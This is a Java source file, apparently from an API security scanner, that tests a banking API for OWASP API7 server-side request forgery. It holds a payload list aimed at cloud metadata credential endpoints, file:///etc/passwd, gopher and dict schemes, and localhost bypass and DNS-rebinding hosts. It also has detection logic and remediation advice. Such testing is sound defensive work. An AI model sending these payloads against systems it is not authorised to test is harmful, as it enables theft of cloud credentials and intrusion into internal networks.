package scanners.owasp;

import scanners.SecurityScanner;
import core.ScanConfig;
import core.Vulnerability;
import core.ApiClient;
import core.HttpApiClient;
import io.swagger.v3.oas.models.OpenAPI;
import io.swagger.v3.oas.models.PathItem;
import io.swagger.v3.oas.models.Operation;
import io.swagger.v3.oas.models.parameters.Parameter;
import io.swagger.v3.oas.models.media.Schema;
import io.swagger.v3.oas.models.media.StringSchema;
import io.swagger.v3.oas.models.media.ObjectSchema;

import java.util.*;

public class API7_SSRFScanner implements SecurityScanner {

    // Обновленный список настоящих URL-параметров (убрали client_id, bank_code и другие не-URL параметры)
    private static final Set<String> URL_PARAMETERS = new HashSet<>(Arrays.asList(
            "url", "webhook", "callback", "image", "target", "redirect",
            "return", "next", "uri", "path", "file", "load", "fetch",
            "download", "source", "destination", "endpoint", "service",
            "avatar_url", "logo_url", "icon_url", "confirmation_url",
            "notification_url", "webhook_url", "callback_url", "return_url",
            "redirect_uri", "success_url", "failure_url", "cancel_url"
    ));

    // Специфичные для банковского API URL-параметры
    private static final Set<String> BANKING_URL_PARAMETERS = new HashSet<>(Arrays.asList(
            "redirect_uri", "webhook_url", "callback_url", "notification_url",
            "confirmation_url", "return_url", "success_url", "failure_url"
    ));

    // Более целевые SSRF цели для банковского API
    private static final List<String> SSRF_TARGETS = Arrays.asList(
            // Локальные банковские сервисы
            "http://localhost:8080/internal/accounts",
            "http://127.0.0.1:8080/admin",
            "http://localhost:9090/metrics",
            "http://127.0.0.1:9090/health",

            // Внутренние банковские сети
            "http://192.168.1.1/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://internal.bank.api/",
            "http://database.internal/",

            // Облачные метаданные
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",

            // Опасные схемы
            "file:///etc/passwd",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "gopher://localhost:25/_TEST",
            "dict://localhost:11211/stat",

            // Обходы валидации
            "http://localtest.me",
            "http://127.0.0.1.nip.io",
            "http://0x7f000001",
            "http://2130706433",
            "http://[::1]/",

            // DNS rebinding targets (для 5.7.7)
            "http://7f000001.0a000100.rbdrr.io/",
            "http://localhost.127.0.0.1.xip.io/",
            "http://127.0.0.1.xip.io/",
            "http://169.254.169.254.xip.io/"
    );

    @Override
    public String getName() {
        return "OWASP API7: Server Side Request Forgery (SSRF) Scanner";
    }

    @Override
    public List<Vulnerability> scan(Object openApiObj, ScanConfig config, ApiClient apiClient) {
        System.out.println("(API-7) Запуск сканирования уязвимостей Server Side Request Forgery (SSRF)...");
        List<Vulnerability> vulnerabilities = new ArrayList<>();

        if (!(openApiObj instanceof OpenAPI)) {
            System.out.println("(API-7) Ошибка: Неверный формат OpenAPI спецификации");
            return vulnerabilities;
        }

        OpenAPI openAPI = (OpenAPI) openApiObj;

        // 1. Анализ OpenAPI спецификации для поиска настоящих URL параметров
        Map<String, Set<String>> endpointUrlParams = analyzeOpenAPIForRealUrlParameters(openAPI);
        System.out.println("(API-7) Найдено эндпоинтов с URL параметрами: " + endpointUrlParams.size());

        // 2. Если анализ спецификации не дал результатов, используем целевой поиск в банковском API
        if (endpointUrlParams.isEmpty()) {
            System.out.println("(API-7) Анализ спецификации не нашел URL параметров, используется целевой поиск");
            endpointUrlParams = targetBankingEndpointsAnalysis(openAPI);
        }

        // 3. Тестирование каждого эндпоинта с целевыми payload'ами
        for (Map.Entry<String, Set<String>> entry : endpointUrlParams.entrySet()) {
            String endpoint = entry.getKey();
            Set<String> urlParameters = entry.getValue();

            // Заменяем path параметры на реальные значения
            String testableEndpoint = replacePathParameters(endpoint);
            if (testableEndpoint == null) {
                System.out.println("(API-7) Пропускаем эндпоинт с path параметрами: " + endpoint);
                continue;
            }

            System.out.println("(API-7) Тестирование эндпоинта: " + testableEndpoint + " с параметрами: " + urlParameters);
            testEndpointWithSSRFPayloads(config, apiClient, vulnerabilities, testableEndpoint, urlParameters);
        }

        // 4. Специальная проверка callback/webhook эндпоинтов
        testBankingCallbackEndpoints(config, apiClient, vulnerabilities);

        System.out.println("(API-7) Сканирование SSRF завершено. Найдено уязвимостей: " + vulnerabilities.size());
        return vulnerabilities;
    }

    private Map<String, Set<String>> analyzeOpenAPIForRealUrlParameters(OpenAPI openAPI) {
        Map<String, Set<String>> result = new HashMap<>();

        if (openAPI.getPaths() == null) {
            return result;
        }

        System.out.println("(API-7) Углубленный анализ спецификации на наличие URL параметров...");

        for (String path : openAPI.getPaths().keySet()) {
            PathItem pathItem = openAPI.getPaths().get(path);
            Set<String> urlParams = new HashSet<>();

            // Анализ операций для каждого HTTP метода
            for (Operation operation : getOperationsFromPathItem(pathItem)) {
                if (operation == null) continue;

                // Анализ query параметров
                if (operation.getParameters() != null) {
                    for (Parameter param : operation.getParameters()) {
                        if (isRealUrlParameter(param)) {
                            urlParams.add(param.getName());
                            System.out.println("(API-7)   Найден URL параметр в query: " + param.getName() + " в " + path);
                        }
                    }
                }

                // Углубленный анализ тела запроса
                if (operation.getRequestBody() != null &&
                        operation.getRequestBody().getContent() != null) {

                    for (String contentType : operation.getRequestBody().getContent().keySet()) {
                        Schema<?> schema = operation.getRequestBody().getContent().get(contentType).getSchema();
                        if (schema != null) {
                            findRealUrlParametersInSchema(schema, "", urlParams, path);
                        }
                    }
                }
            }

            if (!urlParams.isEmpty()) {
                result.put(path, urlParams);
            }
        }

        return result;
    }

    private Map<String, Set<String>> targetBankingEndpointsAnalysis(OpenAPI openAPI) {
        Map<String, Set<String>> result = new HashMap<>();

        // Целевой анализ банковских эндпоинтов, которые могут содержать URL параметры
        Map<String, Set<String>> bankingEndpoints = new HashMap<>();

        // Эндпоинты аутентификации - могут иметь redirect_uri
        bankingEndpoints.put("/auth/bank-token", new HashSet<>(Arrays.asList("redirect_uri")));

        // Эндпоинты согласий - могут иметь callback URLs
        bankingEndpoints.put("/account-consents/request", new HashSet<>(Arrays.asList("callback_url", "webhook_url")));
        bankingEndpoints.put("/payment-consents/request", new HashSet<>(Arrays.asList("callback_url", "notification_url")));

        // Эндпоинты платежей - могут иметь webhook URLs
        bankingEndpoints.put("/payments", new HashSet<>(Arrays.asList("webhook_url", "callback_url")));

        // Эндпоинты продуктов - могут иметь URL для уведомлений
        bankingEndpoints.put("/customer-leads", new HashSet<>(Arrays.asList("confirmation_url", "callback_url")));
        bankingEndpoints.put("/product-application", new HashSet<>(Arrays.asList("return_url", "callback_url")));

        // Проверяем, существуют ли эти эндпоинты в спецификации
        for (String endpoint : bankingEndpoints.keySet()) {
            if (openAPI.getPaths().containsKey(endpoint)) {
                result.put(endpoint, bankingEndpoints.get(endpoint));
                System.out.println("(API-7) Добавлен целевой эндпоинт: " + endpoint + " с параметрами: " + bankingEndpoints.get(endpoint));
            }
        }

        return result;
    }

    private boolean isRealUrlParameter(Parameter param) {
        if (param == null || param.getName() == null) return false;

        String paramName = param.getName().toLowerCase();

        // Проверка по имени параметра
        if (URL_PARAMETERS.contains(paramName) || BANKING_URL_PARAMETERS.contains(paramName)) {
            return true;
        }

        // Проверка по описанию
        if (param.getDescription() != null) {
            String description = param.getDescription().toLowerCase();
            if (description.contains("url") || description.contains("uri") ||
                    description.contains("webhook") || description.contains("callback") ||
                    description.contains("redirect") || description.contains("endpoint") ||
                    description.contains("notification")) {
                return true;
            }
        }

        // Проверка схемы параметра
        if (param.getSchema() instanceof StringSchema) {
            StringSchema stringSchema = (StringSchema) param.getSchema();
            if (stringSchema.getFormat() != null &&
                    ("uri".equals(stringSchema.getFormat()) || "url".equals(stringSchema.getFormat()))) {
                return true;
            }
        }

        return false;
    }

    private void findRealUrlParametersInSchema(Schema<?> schema, String path, Set<String> urlParams, String endpoint) {
        if (schema == null) return;

        // Обработка свойств объекта
        if (schema.getProperties() != null) {
            for (String propName : schema.getProperties().keySet()) {
                Schema<?> propSchema = (Schema<?>) schema.getProperties().get(propName);
                String fullPath = path.isEmpty() ? propName : path + "." + propName;

                // Проверка, является ли свойство URL параметром
                boolean isUrlParam = URL_PARAMETERS.contains(propName.toLowerCase()) ||
                        BANKING_URL_PARAMETERS.contains(propName.toLowerCase());

                boolean hasUrlFormat = propSchema instanceof StringSchema &&
                        ("uri".equals(propSchema.getFormat()) || "url".equals(propSchema.getFormat()));

                boolean hasUrlDescription = propSchema.getDescription() != null &&
                        (propSchema.getDescription().toLowerCase().contains("url") ||
                                propSchema.getDescription().toLowerCase().contains("uri"));

                if (isUrlParam || hasUrlFormat || hasUrlDescription) {
                    urlParams.add(fullPath);
                    System.out.println("(API-7)   Найден URL параметр в теле: " + fullPath + " в " + endpoint);
                }

                // Рекурсивный поиск во вложенных объектах
                findRealUrlParametersInSchema(propSchema, fullPath, urlParams, endpoint);
            }
        }
    }

    private String replacePathParameters(String endpoint) {
        // Заменяем path параметры на реальные значения
        if (endpoint.contains("{") && endpoint.contains("}")) {
            String testableEndpoint = endpoint;

            // Простые замены для банковских path параметров
            testableEndpoint = testableEndpoint.replace("{account_id}", "test-account-123");
            testableEndpoint = testableEndpoint.replace("{consent_id}", "test-consent-456");
            testableEndpoint = testableEndpoint.replace("{agreement_id}", "test-agreement-789");
            testableEndpoint = testableEndpoint.replace("{payment_id}", "test-payment-101");
            testableEndpoint = testableEndpoint.replace("{product_id}", "test-product-112");

            // Если остались необработанные параметры, пропускаем эндпоинт
            if (testableEndpoint.contains("{") && testableEndpoint.contains("}")) {
                return null;
            }

            return testableEndpoint;
        }

        return endpoint;
    }

    private List<Operation> getOperationsFromPathItem(PathItem pathItem) {
        List<Operation> operations = new ArrayList<>();
        if (pathItem.getGet() != null) operations.add(pathItem.getGet());
        if (pathItem.getPost() != null) operations.add(pathItem.getPost());
        if (pathItem.getPut() != null) operations.add(pathItem.getPut());
        if (pathItem.getDelete() != null) operations.add(pathItem.getDelete());
        if (pathItem.getPatch() != null) operations.add(pathItem.getPatch());
        return operations;
    }

    private void testEndpointWithSSRFPayloads(ScanConfig config, ApiClient apiClient,
                                              List<Vulnerability> vulnerabilities,
                                              String endpoint, Set<String> urlParameters) {

        for (String parameter : urlParameters) {
            List<String> relevantPayloads = getRelevantPayloadsForParameter(parameter);
            for (String payload : relevantPayloads) {
                try {
                    String url = config.getTargetBaseUrl() + endpoint;
                    Map<String, String> headers = createBankingHeaders(endpoint);
                    String method = getHttpMethodForEndpoint(endpoint);
                    String body = generateTargetedRequestBody(endpoint, parameter, payload);

                    System.out.println("(API-7)   Тестирование: " + parameter + " = " + payload);

                    Object response = apiClient.executeRequest(method, url, body, headers);

                    if (response instanceof HttpApiClient.ApiResponse) {
                        HttpApiClient.ApiResponse httpResponse = (HttpApiClient.ApiResponse) response;

                        if (isConfirmedSSRF(httpResponse, payload, parameter)) {
                            Vulnerability vuln = createSSRFVulnerability(
                                    "SSRF в " + endpoint,
                                    "Обнаружена SSRF уязвимость через параметр: " + parameter,
                                    Vulnerability.Severity.HIGH,
                                    endpoint,
                                    parameter,
                                    payload,
                                    httpResponse
                            );
                            vulnerabilities.add(vuln);
                            System.out.println("(API-7) УЯЗВИМОСТЬ: SSRF в " + endpoint + " параметр=" + parameter);
                        }
                    }

                } catch (Exception e) {
                    System.out.println("(API-7)   Ошибка при тестировании: " + e.getMessage());
                }
            }
        }
    }

    private void testBankingCallbackEndpoints(ScanConfig config, ApiClient apiClient,
                                              List<Vulnerability> vulnerabilities) {
        System.out.println("(API-7) Тестирование банковских callback эндпоинтов...");

        // Тестируем потенциальные callback эндпоинты банковского API
        List<String> bankingCallbackEndpoints = Arrays.asList(
                "/webhook", "/callback", "/notification", "/interbank/receive",
                "/payment-notifications", "/consent-callback"
        );

        for (String endpoint : bankingCallbackEndpoints) {
            System.out.println("(API-7) Тестирование callback эндпоинта: " + endpoint);
            testBankingCallbackEndpoint(config, apiClient, vulnerabilities, endpoint);
        }
    }

    private void testBankingCallbackEndpoint(ScanConfig config, ApiClient apiClient,
                                             List<Vulnerability> vulnerabilities, String endpoint) {

        // Ограничиваем количество payload'ов для callback тестов
        List<String> testPayloads = SSRF_TARGETS.subList(0, Math.min(8, SSRF_TARGETS.size()));

        for (String payload : testPayloads) {
            try {
                String url = config.getTargetBaseUrl() + endpoint;
                Map<String, String> headers = createBankingHeaders(endpoint);

                // Специальные payload'ы для банковских callback эндпоинтов
                String body = String.format(
                        "{\"url\": \"%s\", \"type\": \"webhook\", \"event\": \"payment.completed\", \"data\": {\"amount\": 100.0, \"currency\": \"RUB\"}}",
                        payload
                );

                Object response = apiClient.executeRequest("POST", url, body, headers);

                if (response instanceof HttpApiClient.ApiResponse) {
                    HttpApiClient.ApiResponse httpResponse = (HttpApiClient.ApiResponse) response;

                    if (isConfirmedSSRF(httpResponse, payload, "url")) {
                        Vulnerability vuln = createSSRFVulnerability(
                                "SSRF в callback эндпоинте " + endpoint,
                                "Callback эндпоинт уязвим к SSRF атакам",
                                Vulnerability.Severity.HIGH,
                                endpoint,
                                "url",
                                payload,
                                httpResponse
                        );
                        vulnerabilities.add(vuln);
                        System.out.println("(API-7) УЯЗВИМОСТЬ: SSRF в callback эндпоинте " + endpoint);
                    }
                }

            } catch (Exception e) {
                // Тихая обработка ошибок для callback эндпоинтов
            }
        }
    }

    private List<String> getRelevantPayloadsForParameter(String parameter) {
        List<String> relevantPayloads = new ArrayList<>();
        String paramLower = parameter.toLowerCase();

        // Выбор релевантных payload'ов в зависимости от типа параметра
        if (paramLower.contains("webhook") || paramLower.contains("callback") || paramLower.contains("notification")) {
            // Для webhook/callback - внешние URL
            relevantPayloads.addAll(SSRF_TARGETS.subList(0, Math.min(8, SSRF_TARGETS.size())));
        } else if (paramLower.contains("file") || paramLower.contains("image") || paramLower.contains("avatar")) {
            // Для файлов - file:// схемы
            relevantPayloads.add("file:///etc/passwd");
            relevantPayloads.add("file:///c:/windows/system32/drivers/etc/hosts");
        } else if (paramLower.contains("redirect") || paramLower.contains("return")) {
            // Для редиректов - обходы валидации
            relevantPayloads.addAll(SSRF_TARGETS.subList(Math.max(0, SSRF_TARGETS.size() - 9), SSRF_TARGETS.size()));
        } else {
            // По умолчанию - облачные метаданные и локальные сервисы
            int start = Math.min(8, SSRF_TARGETS.size());
            int end = Math.min(16, SSRF_TARGETS.size());
            relevantPayloads.addAll(SSRF_TARGETS.subList(start, end));
        }

        // Ограничиваем количество тестов
        return relevantPayloads.size() > 5 ? relevantPayloads.subList(0, 5) : relevantPayloads;
    }

    // УЛУЧШЕННАЯ ЛОГИКА ОБНАРУЖЕНИЯ SSRF
    private boolean isConfirmedSSRF(HttpApiClient.ApiResponse response, String payload, String parameter) {
        int status = response.getStatusCode();
        String body = response.getBody().toLowerCase();
        Map<String, List<String>> headers = response.getHeaders();

        // Игнорируем стандартные ошибки аутентификации и валидации
        if (status == 401 || status == 403) {
            return false;
        }

        if (status == 422 && (body.contains("validation") || body.contains("missing") || body.contains("required"))) {
            return false;
        }

        if (status == 404) {
            return false;
        }

        // 1. Успешные ответы на внутренние адреса
        if ((status == 200 || status == 201) && isInternalPayload(payload)) {
            if (!isStandardSuccessResponse(body) && !isBankingAPIResponse(body)) {
                return true;
            }
        }

        // 2. Ответы с содержимым облачных метаданных
        if (payload.contains("169.254.169.254") || payload.contains("metadata.google.internal")) {
            if (body.contains("instance-id") || body.contains("ami-id") || body.contains("hostname") ||
                    body.contains("computemetadata") || body.contains("project-id") ||
                    body.contains("service-accounts")) {
                return true;
            }
        }

        // 3. Ответы с содержимым файловой системы
        if (payload.startsWith("file://") &&
                (body.contains("root:") || body.contains("/etc/") || body.contains("windows") ||
                        body.contains("administrator:") || body.contains("password:"))) {
            return true;
        }

        // 4. Ошибки, указывающие на успешное соединение с внутренним сервисом
        if (status >= 500 && isInternalPayload(payload)) {
            if (body.contains("connection refused") || body.contains("connection timeout") ||
                    body.contains("invalid response") || body.contains("protocol error") ||
                    body.contains("socket") || body.contains("econnrefused")) {
                return true;
            }
        }

        // 5. Редиректы на внутренние адреса
        if (status >= 300 && status < 400) {
            String locationHeader = getHeaderValue(headers, "location");
            if (locationHeader != null && isInternalTarget(locationHeader)) {
                return true;
            }
        }

        return false;
    }

    private boolean isInternalPayload(String payload) {
        return payload.contains("localhost") || payload.contains("127.0.0.1") ||
                payload.contains("192.168.") || payload.contains("10.") ||
                payload.contains("172.16.") || payload.contains("[::1]") ||
                payload.contains("internal.") || payload.contains(".internal") ||
                payload.contains("169.254.169.254") || payload.contains("metadata.google.internal");
    }

    private boolean isInternalTarget(String target) {
        return target.contains("localhost") || target.contains("127.0.0.1") ||
                target.contains("192.168.") || target.contains("10.") ||
                target.contains("172.16.") || target.contains("[::1]");
    }

    private boolean isStandardSuccessResponse(String body) {
        return body.contains("\"status\":\"success\"") ||
                body.contains("\"result\":\"ok\"") ||
                body.contains("\"message\":\"success\"") ||
                (body.contains("\"status\"") && body.contains("200")) ||
                body.contains("standard response") ||
                body.contains("api response");
    }

    private boolean isBankingAPIResponse(String body) {
        return body.contains("\"account_id\"") || body.contains("\"balance\"") ||
                body.contains("\"transaction\"") || body.contains("\"payment\"") ||
                body.contains("\"consent\"") || body.contains("banking") ||
                body.contains("\"currency\"") || body.contains("\"amount\"") ||
                body.contains("\"client_id\"") || body.contains("\"access_token\"");
    }

    private String getHttpMethodForEndpoint(String endpoint) {
        if (endpoint.contains("/auth/")) {
            return "POST";
        } else if (endpoint.contains("/accounts") && !endpoint.contains("/transactions")) {
            return "GET";
        } else if (endpoint.contains("/products")) {
            return "GET";
        } else if (endpoint.contains("/payment-consents") || endpoint.contains("/payments")) {
            return "POST";
        } else if (endpoint.contains("/webhook") || endpoint.contains("/callback")) {
            return "POST";
        } else {
            return "POST";
        }
    }

    private String generateTargetedRequestBody(String endpoint, String parameter, String payload) {
        if (endpoint.contains("/payment")) {
            return String.format(
                    "{\"data\":{\"initiation\":{\"instructedAmount\":{\"amount\":\"100.00\",\"currency\":\"RUB\"}}},\"risk\":{\"%s\":\"%s\"}}",
                    parameter, payload
            );
        } else if (endpoint.contains("/auth")) {
            return String.format("{\"redirect_uri\": \"%s\", \"client_id\": \"test\", \"client_secret\": \"test\"}", payload);
        } else if (endpoint.contains("/customer") || endpoint.contains("/product")) {
            return String.format("{\"user_data\": {\"%s\": \"%s\"}, \"full_name\": \"Test User\"}", parameter, payload);
        } else if (endpoint.contains("/webhook") || endpoint.contains("/callback")) {
            return String.format("{\"url\": \"%s\", \"type\": \"notification\", \"events\": [\"payment.completed\"]}", payload);
        } else if (endpoint.contains("/account-consents")) {
            return String.format(
                    "{\"client_id\": \"test-client\", \"permissions\": [\"ReadAccountsDetail\"], \"%s\": \"%s\"}",
                    parameter, payload
            );
        } else {
            return String.format("{\"%s\": \"%s\", \"test_field\": \"test_value\"}", parameter, payload);
        }
    }

    private Map<String, String> createBankingHeaders(String endpoint) {
        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json");
        headers.put("User-Agent", "Security-Scanner/1.0");
        headers.put("Accept", "application/json");

        if (!endpoint.contains("/auth/")) {
            headers.put("X-Requesting-Bank", "security-test");
            headers.put("Authorization", "Bearer test-token");
        }

        if (endpoint.contains("/interbank") || endpoint.contains("/payment")) {
            headers.put("X-Consent-Id", "test-consent-123");
            headers.put("X-FAPI-Interaction-ID", UUID.randomUUID().toString());
        }

        return headers;
    }

    private String getHeaderValue(Map<String, List<String>> headers, String headerName) {
        if (headers == null) return null;
        for (Map.Entry<String, List<String>> entry : headers.entrySet()) {
            if (entry.getKey().equalsIgnoreCase(headerName)) {
                List<String> values = entry.getValue();
                if (values != null && !values.isEmpty()) {
                    return values.get(0);
                }
            }
        }
        return null;
    }

    private Vulnerability createSSRFVulnerability(String title, String description,
                                                  Vulnerability.Severity severity,
                                                  String endpoint, String parameter,
                                                  String payload, HttpApiClient.ApiResponse response) {
        Vulnerability vuln = new Vulnerability();
        vuln.setTitle("API7:2023 - " + title);
        vuln.setDescription(description +
                " Система обработала SSRF payload и вернула статус " + response.getStatusCode() +
                ". Payload: " + payload + " был передан в параметре " + parameter +
                ". Ответ сервера указывает на успешную обработку внутреннего запроса.");
        vuln.setSeverity(severity);
        vuln.setCategory(Vulnerability.Category.OWASP_API7_SSRF);
        vuln.setEndpoint(endpoint);
        vuln.setMethod("POST");
        vuln.setParameter(parameter);

        String evidence = String.format(
                "SSRF Payload: %s\nParameter: %s\nResponse Status: %d\nResponse Body: %s",
                payload, parameter, response.getStatusCode(),
                response.getBody().length() > 200 ? response.getBody().substring(0, 200) + "..." : response.getBody()
        );
        vuln.setEvidence(evidence);

        vuln.setRecommendations(Arrays.asList(
                "Валидация и санитизация всех пользовательских URL",
                "Реализация белого списка разрешенных доменов",
                "Блокировка доступа к внутренним IP диапазонам (127.0.0.1, 192.168.*.*, 10.*.*.*, 172.16.*.*)",
                "Отключение опасных URL схем (file://, gopher://, dict://)",
                "Использование сетевой сегментации и исходящих фаерволов",
                "Реализация proper error handling для избежания раскрытия информации",
                "Проверка DNS записей для предотвращения DNS rebinding атак",
                "Ограничение времени выполнения HTTP запросов"
        ));

        vuln.setStatusCode(response.getStatusCode());

        return vuln;
    }
}